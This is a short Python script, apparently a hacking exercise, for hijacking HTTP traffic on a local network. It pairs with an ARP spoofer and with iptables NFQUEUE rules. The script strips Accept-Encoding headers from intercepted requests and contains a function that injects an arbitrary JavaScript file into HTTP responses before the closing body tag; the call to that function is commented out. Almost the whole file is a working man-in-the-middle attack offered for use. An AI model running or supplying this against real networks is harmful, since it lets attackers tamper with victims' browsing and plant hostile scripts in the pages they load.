# The idea of the traficHijack is to execute this with 2 terminals, one with the spoofarp running and
# another with this script

# We also need to execute this commands:

# sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

# sudo iptables -I INPUT -i ens33 -j NFQUEUE --queue-num 0

# To restore this:

# sudo iptables -D INPUT -j NFQUEUE --queue-num 0
# sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0
# sudo iptables -D FORWARD -j NFQUEUE --queue-num 0

import scapy.all as scapy
import netfilterqueue 
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def TextToReplace(packet, to_replace, new_text):
    return packet[scapy.Raw].load.replace(to_replace.encode(), new_text.encode())


def InjectJS(packet, js_file):
    # Lee el archivo JS
    with open(js_file, "rb") as f:
        js_code = f.read().replace(b"\n", b"")  # Elimina saltos de línea

    # Asegúrate de que el contenido tenga el formato correcto
    js_code = b"<script>" + js_code + b"</script>"

    # Asegúrate de que no cause problemas con el HTML
    load = packet[scapy.Raw].load
    if b"</body>" in load:
        return load.replace(b"</body>", js_code + b"</body>")
    else:
        return load + js_code  # Agregarlo al final si no hay </body>



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:

                modified = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                new_packet = set_load(scapy_packet, modified) 
                packet.set_payload(new_packet.build()) 

            elif scapy_packet[scapy.TCP].sport == 80: 
                pass
                #modified_load = InjectJS(scapy_packet, "js.js")
                #new_packet = set_load(scapy_packet, modified_load)
                #packet.set_payload(new_packet.build()) 


        except Exception as e:
            pass
    

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()